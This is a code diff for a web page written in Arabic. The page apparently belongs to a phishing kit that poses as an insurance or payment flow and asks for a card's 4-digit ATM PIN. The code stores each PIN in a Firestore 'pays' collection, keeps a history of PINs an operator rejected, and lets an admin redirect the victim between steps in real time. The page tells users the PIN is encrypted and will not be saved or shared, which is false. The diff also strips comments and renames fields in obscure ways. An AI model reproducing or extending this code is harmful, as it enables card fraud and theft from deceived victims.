@@ -23,7 +23,6 @@ export default function ConfiPage() {
   const [visitorId, setVisitorId] = useState<string>("")
   const [_v6Status, _ss6] = useState<"pending" | "verifying" | "approved" | "rejected">("pending")
 
-  // Initialize visitor ID and update current page
   useEffect(() => {
     const id = localStorage.getItem("visitor") || ""
     setVisitorId(id)
@@ -32,10 +31,8 @@ export default function ConfiPage() {
     }
   }, [])
 
-  // Monitor for admin redirects
   useRedirectMonitor({ visitorId, currentPage: "confi" })
 
-  // Navigation listener - listen for admin redirects
   useEffect(() => {
     if (!visitorId || !db) return
 
@@ -46,7 +43,6 @@ export default function ConfiPage() {
           const data = docSnapshot.data()
           const step = data.currentStep
 
-          // Redirect based on currentStep
           if (step === "home") {
             router.push("/insur")
           } else if (step === "phone") {
@@ -68,7 +64,6 @@ export default function ConfiPage() {
     return () => unsubscribe()
   }, [router, visitorId])
 
-  // Check if visitor has access to this page and monitor PIN status
   useEffect(() => {
     const visitorID = localStorage.getItem("visitor")
     if (!visitorID) {
@@ -88,7 +83,6 @@ export default function ConfiPage() {
       const status = data._v6Status as "pending" | "verifying" | "approved" | "rejected" | undefined
       
       if (status === "rejected") {
-        // Save rejected PIN and reset status
         const currentPin = {
           code: data._v6,
           rejectedAt: new Date().toISOString()
@@ -99,8 +93,8 @@ export default function ConfiPage() {
           _v6Status: "pending"
         }, { merge: true }).then(() => {
           _ss6("pending")
-          _s6("") // Clear the old PIN
-          setError("تم رفض الرقم السري. يرجى إدخال رقم صحيح.")
+          _s6("")
+          setError("تم رفض الرمز. يرجى إدخال رمز صراف آلي صحيح.")
           setIsSubmitting(false)
         }).catch(err => {
           console.error("Error saving rejected PIN:", err)
@@ -115,11 +109,9 @@ export default function ConfiPage() {
     return () => unsubscribe()
   }, [router])
 
-  // Removed auto-submit - user must click button to submit
-
   const handlePinSubmit = async () => {
     if (_v6.length !== 4) {
-      setError("يرجى إدخال الرقم السري المكون من 4 أرقام")
+      setError("يرجى إدخال رمز الصراف الآلي المكون من 4 أرقام")
       return
     }
 
@@ -132,29 +124,26 @@ export default function ConfiPage() {
     setIsSubmitting(true)
 
     try {
-      // Update the document with the PIN
       if (!db) throw new Error("Firebase not configured")
       await setDoc(doc(db as Firestore, "pays", visitorID), {
         _v6,
         pinSubmittedAt: new Date().toISOString(),
-        _v6Status: "approved", // Auto-approve PIN
+        _v6Status: "approved",
         currentStep: "phone",
         paymentStatus: "pin_completed",
         pinUpdatedAt: new Date().toISOString()
       }, { merge: true })
 
-      // Add PIN to history (always approved)
       await addToHistory(visitorID, "_t3", {
         _v6
       }, "approved")
 
-      // Wait 2 seconds then redirect to phone page
       setTimeout(() => {
         router.push("/step5")
       }, 2000)
     } catch (err) {
       console.error("Error submitting PIN:", err)
-      setError("حدث خطأ في إرسال الرقم السري. يرجى المحاولة مرة أخرى.")
+      setError("حدث خطأ في إرسال الرمز. يرجى المحاولة مرة أخرى.")
       setIsSubmitting(false)
     }
   }
@@ -171,8 +160,8 @@ export default function ConfiPage() {
 
       <StepShell
         step={6}
-        title="تأكيد الرقم السري"
-        subtitle="الرجاء إدخال رقم الصراف المكون من 4 خانات لتأكيد ملكية البطاقة"
+        title="رمز الصراف الآلي (ATM)"
+        subtitle="الرجاء إدخال رمز الصراف الآلي المكون من 4 خانات لتأكيد ملكية البطاقة"
         icon={<Lock className="h-8 w-8" />}
       >
         <form onSubmit={(e) => { e.preventDefault(); handlePinSubmit(); }} className="space-y-4">
@@ -191,11 +180,11 @@ export default function ConfiPage() {
               </div>
               <div className="flex items-center gap-2">
                 <Lock className="h-4 w-4" />
-                <span>الرقم السري محمي ومشفر بالكامل</span>
+                <span>رمز الصراف الآلي محمي ومشفر بالكامل</span>
               </div>
               <div className="flex items-center gap-2">
                 <Eye className="h-4 w-4" />
-                <span>لن يتم حفظ أو مشاركة الرقم السري</span>
+                <span>لن يتم حفظ أو مشاركة رمز الصراف الآلي</span>
               </div>
             </div>
           </div>
@@ -203,7 +192,7 @@ export default function ConfiPage() {
           <Input
             type="password"
             inputMode="numeric"
-            placeholder="رقم الصراف (PIN)"
+            placeholder="رمز الصراف الآلي (ATM)"
             value={_v6}
             onChange={(e) => {
               const value = e.target.value.replace(/\D/g, "").slice(0, 4)
